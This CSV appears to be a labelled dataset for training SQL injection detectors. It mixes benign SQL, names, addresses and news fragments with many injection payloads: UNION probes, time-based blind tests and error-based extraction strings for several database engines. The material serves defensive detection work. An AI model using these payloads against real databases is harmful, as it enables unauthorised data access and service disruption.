Query,Label
"-3361'|| ( select 'msfi' where 4806 = 4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1
"-7295""  )   or 9323  =  9323#",1
"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1
19133,0
takakura@cenitsoria.sb,0
select  ( case when  ( 9907 = 2736 )  then 9907 else 9907* ( select 9907 from mysql.db )  end ) #,1
scala@novisa.ch,0
aristofnico,0
"-5703' )  or elt ( 2972 = 8708,8708 )",1
SELECT * FROM dirty WHERE fellow  BETWEEN 10 AND 20,0
"-6815 where 7609 = 7609 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
bartush,0
coallier,0
"select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1
784,0
armaanzas,0
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )",1
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"SELECT COUNT ( forget ) , appearance FROM say BY flame",0
1  )   as sdnd where 9472  =  9472,1
l0s4njear,0
SELECT AVG ( describe ) FROM cat,0
SELECT * FROM  ( SELECT theory FROM machinery ),0
cbdar,0
wendell@somosagelespaa.ml,0
or 1 = 1,1
"1 )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 3294 = 3294",1
1  )  )   and 9198 = 9198--,1
73732702s,0
43061609c,0
"1%' )  union all select null,null,null,null,null,null,null--",1
c?idiana,0
palacios del arzobispo,0
errol@diseodesoftware.ml,0
antonio urosa 89,0
"1'|| ( select 'zifu' from dual where 4822 = 4822 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"Since 2006 , eight tunnels type discovered , press conference San Diego continued",0
ligurs,0
"SELECT * FROM wrapped ORDER BY slipped ASC, highest DESC",0
"1"" )  and elt ( 1889 = 7397,7397 )  and  ( ""kuau"" = ""kuau",1
chung,0
"1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",1
"SELECT * FROM live WHERE image NOT IN  ( 'golden', 'union', 'torn' )",0
1' )  where 7629 = 7629 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
25727,0
SELECT * FROM nine,0
"1'||  (  select 'mzhj' where 9677  =  9677 union all select null,null,null--",1
"1%'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1
Mick Jagger says never hit Katy Perry 18,0
patanera,0
"1%'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '",1
SELECT TOP 50 PERCENT * FROM no SELECT * FROM bottle FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM magic,0
SELECT COUNT ( die )  FROM syllable,0
"&quot; Egypt today civil , national , constitutional modern state , &quot; Morsi , wearing blue business suit red tie , told judges wood-panelled chamber took oath office",0
"However , author wish rule possibility pensioners &apos; residential community work",0
Doctors &apos;t sure large clitoris small penis convinced could never live &quot; satisfactory life &quot; man,0
"Transportation secretaries , 2011 report urged Congress move pay-per-mile direction",0
"1"" where 7879  =  7879",1
"calle alonso nuez 186, 12?b",0
1'||  (  select 'yyil' from dual where 3121  =  3121,1
SELECT TOP 3 * FROM lying WHERE straw = 'decide',0
"-6170  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
select sleep ( 5 )  and   (  (   ( 'qjsc' = 'qjsc,1
SELECT * FROM  ( SELECT left FROM quarter ),0
"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",1
"select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
Fire crews called rescue lost puppy got stuck 50ft ground precarious ledge quarry Cocker spaniel Ruby run minor road crash She spotted three days later dog walker trapped quarry Firefighters abseil cliff face pluck dog certain death A puppy lucky escape fire crews called lift safety somehow got stuck 50ft precarious cliff ledge,0
87r5raviat8,0
"SELECT willing, mice, intoFROM hurry WHERE pick  IS NOT NULL",0
SELECT AVG ( tired ) FROM worker SELECT SUM ( rocket ),0
1 )  or sleep ( 5 ),1
sinesio,0
782ilidad,0
5359941637472612,0
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",1
tormellas,0
"c/ ciutat freta, 37",0
SELECT * FROM window WHERE coffee = 'tide',0
SELECT * FROM popular WHERE broke = 'thou' FETCH FIRST 3 ROWS ONLY,0
veit,0
"-3068%""  )  )   union all select 6597,6597,6597,6597,6597,6597,6597,6597--",1
0g83ma7ora,0
"iif ( 2084 = 5671,1,1/0 )",1
1' where 9544 = 9544,1
SELECT * FROM perfect WHERE cloth NOT BETWEEN 'gold' AND 'along',0
calle arquitecto francisco bautista 4 1c,0
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  # tsxs",1
select * from users where id = 1 <@. or 1 = 1 -- 1,1
It would thus suitable assist illegal immigration USA,0
1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',1
sonsoles,0
"Renamo , pushing electoral reforms , already said would boycott municipal elections due November",0
52031263l,0
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"SELECT * FROM possibly ORDER BY concerned ASC, could DESC",0
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
2178510189723400,0
1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||',1
"1'  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  'ltym' = 'ltym",1
It genuinely tropical evening Stuttgart,0
"select * from users where id = 1.<@. union select 1,version (  )  -- 1",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""%""  =  """,1
a04,0
margaux,0
1' )  and  ( 3020 = 3020 ) *6703 and  ( 'lhfa' = 'lhfa,1
SELECT * FROM slept,0
1 )  and 2457 = 8146,1
distinct,1
22122,0
SELECT * FROM bow WHERE practical NOT LIKE 'usually%',0
"-2899""  )  )   as uyoc where 8417 = 8417 union all select 8417,8417,8417,8417--",1
"Schiltach contribute EUR 220,000 project",0
SELECT * FROM captured FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM arrange,0
"1' where 3700  =  3700 union all select null,null,null--",1
marven,0
"1'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1  )  )   union all select null,null--",1
"escritor miguel delibes 0, 7?b",0
villargordo del cabriel,0
bourne_sereys8@demasiado.com.ye,0
1'+  (  select qdon where 9453  =  9453,1
9178266136569781,0
equilibrio,0
SELECT AVG ( therefore ) FROM average,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'vjdk' like 'vjdk",1
"1""  )  )   )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( ""jmjr"" like ""jmjr",1
49339665l,0
sofronio,0
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # eahg",1
SELECT melted FROM strange,0
2424,0
SELECT * FROM apart WHERE composed = 'bicycle',0
SELECT * FROM die WHERE ball = 'edge',0
"select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1",1
select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1
SELECT AVG ( copy ) FROM slip SELECT SUM ( valley ),0
"The mission involves placing detector , consisting two three probes , outer space",0
monegrillo,0
brigida,0
"1""  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""wute"" like ""wute",1
realmente,0
hi or a  =  a,1
"1'|| ( select 'vekn' from dual where 4929 = 4929 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5  )  )  ||'",1
cryoelec,0
2569,0
-4173' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'jdwt' like 'jdwt,1
33600,0
49625,0
farid,0
-4331  )   as inpx where 9804  =  9804 union all select 9804#,1
52382768s,0
"calle carme karr, 65, 10a",0
"-2054%""  )  )   )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""%"" = """,1
ansaldo,0
"1 )  union all select null,null,null,null,null,null,null,null,null#",1
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'ffzv'  =  'ffzv",1
511amasa,0
pearcy@b-sign.mz,0
trixy,0
pawley@santacruzdelvoto.vu,0
"1'  )  )   as hmyc where 6732 = 6732 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
SELECT * FROM trap FETCH FIRST 50 PERCENT ROWS ONLY,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'afdy' like 'afdy",1
SELECT surprise FROM purpose,0
"c/ estornino s/n, 9f",0
SELECT fox FROM first UNION SELECT breakfast FROM mouse ORDER BY silk,0
gorin.mccracken@evelin.am,0
SELECT COUNT ( men )  FROM certainly,0
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'ngxz'  =  'ngxz",1
"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
leo,0
"-9944""  )  )   or 8537 = 2039 and   (  (  ""kfzj"" = ""kfzj",1
"c/ hortensia 48,",0
gurica4,0
-7775 or 8571  =  8571--,1
"1"" where 3227 = 3227 waitfor delay '0:0:5'--",1
SELECT * FROM private,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'afdy' like 'afdy",1
5563798964634481,0
"I wish expiate, live",0
to2adora,0
35591968c,0
This also applies case victims,0
"SELECT * FROM triangle WHERE bare BETWEEN ""laugh"" AND    ""black""",0
SELECT led FROM camera UNION SELECT claws FROM hello ORDER BY outside,0
"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",1
&quot; Relations US Germany come strain following claims NSA bugged Chancellor Angela &apos;s Merkel &apos;s phone,0
"select sleep ( 5 )  and  ( ""tlbp"" = ""tlbp",1
"c/ pintor gomez cano 9, 10?e",0
SELECT * FROM sink WHERE create = 'important',0
"1"" and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
3154062648505137,0
"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""vnso"" like ""vnso",1
ergasto,0
medina del campo,0
1 and 5934 = 7745,1
raimulfo,0
"pasaje trigueros, 170,",0
"-5572"" )  union all select 8131,8131#",1
1421,0
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1
84125384d,0
longhurst-street1@drae2.pa,0
if ( 6842 = 5446 )  select 6842 else drop function vjfq--,1
zulmara,0
"Among others , airports Kopenhagen , Frankfurt Dubai already done away noisy call-outs",0
"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--",1
dentellar,0
"SELECT trap,problem FROM high WHERE tie = 'danger' UNION SELECT attempt, inside FROM hunter",0
The first attempt extinguish fire made using tank fire engine,0
He suffered serious injuries taken &quot; Christophorus 6 &quot; rescue helicopter Salzburg Regional Hospital,0
They know business better anyone else,0
end and   (  (   ( 'xzbk' = 'xzbk,1
"1""  )  )   )  waitfor delay '0:0:5' and   (  (   ( ""tuhy"" like ""tuhy",1
28850,0
larraul,0
68m+b11n,0
palmera,0
cicek0,0
64139121x,0
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1
There Lethe this,0
"-3767'  )   as eefl where 8260  =  8260 union all select 8260,8260,8260,8260,8260,8260,8260#",1
SELECT AVG ( white ) FROM tight,0
asisia,0
bartlett@waterflyesp.eh,0
glickman,0
-6145 or   (  8459  =  8459  )  *4906-- yklv,1
"1"" )  rlike sleep ( 5 ) #",1
1'  )  )   )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 'eocx' = 'eocx,1
9857,0
"Their two real two, four real four; every word say chagrins us, know begin set right",0
bora,0
"1 )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 2868 = 2868",1
"c/ san miguel, 111 6?f",0
-9363%' or  ( 8459 = 8459 ) *4906 and '%' = ',1
yoshiyam,0
ate7t3r,0
SELECT * FROM cabin 3,0
The tribunal also power seize property offender fine paid,0
villagomez@nutrimama.uy,0
sfiroudi,0
SELECT Count ( * )  AS giant,0
"select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",1
select   (  case when   (  6615  =  3564  )   then 1 else 6615*  (  select 6615 from master..sysdatabases  )   end  )  --,1
"1"" )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( ""ubvd"" = ""ubvd",1
SELECT column_name ( s )  FROM table2,0
olimpia,0
16360,0
6764,0
"1""  )  )   as oxrr where 6141 = 6141 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
jorey@20horas.ao,0
"calle robert gerhard, s/n 6c",0
' or '7659' = '7659,1
"-2325 )  union all select 4692,4692,4692,4692#",1
1  )   as hhly where 2906  =  2906,1
--,1
SELECT * FROM raw  WHERE glass = sentence,0
"-8331' )  union all select 1452,1452,1452,1452,1452--",1
"-9978"" or make_set ( 4893 = 9765,9765 )  and ""mhjt"" = ""mhjt",1
"Renamo notorious rebel movement , initially backed white-ruled Rhodesia South Africa &apos;s apartheid government part efforts destabilise country &apos;s independent government",0
SELECT * FROM rocket FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ate,0
mud6787t6,0
1%' and  ( 3020 = 3020 ) *6703 and '%' = ',1
"1%' )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( '%' = '",1
"1%' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
obscurantismo,0
t!74ador,0
34964894h,0
1'  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  'ltki' = 'ltki,1
1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,1
greg,0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,1
puigpunyent,0
"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",1
"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"-3090"" or make_set ( 9354 = 9354,7185 )  and ""qowe"" like ""qowe",1
"1"" )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""zyeo"" like ""zyeo",1
hi' or 'a'  =  'a,1
9006,0
"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
or sleep ( __TIME__ ) #,1
49645694x,0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",1
"On tour premises , children work stories true made",0
SELECT * FROM medicine WHERE government NOT LIKE '[feed]%',0
"-5526 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
The Associated Press reports target Russian-made SA-125 missiles,0
select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1
SELECT * FROM star WHERE NOT own = 'structure'  AND NOT now = 'fair',0
serpiginoso,0
yern,0
SELECT * FROM alive WHERE Price NOT BETWEEN 10 AND 20,0
8267431025409914,0
"-7469 )  where 5875 = 5875 or make_set ( 9354 = 9354,7185 ) --",1
ludwig_schuster@viavilano.web,0
"Else, to-morrow stranger say masterly good sense precisely thought felt time, shall forced take shame opinion another",0
mccowen@esencialser.mn,0
8119850000000000,0
SELECT COUNT ( anyone ) FROM thy,0
ehrlich.selwyne@ebaz.ba,0
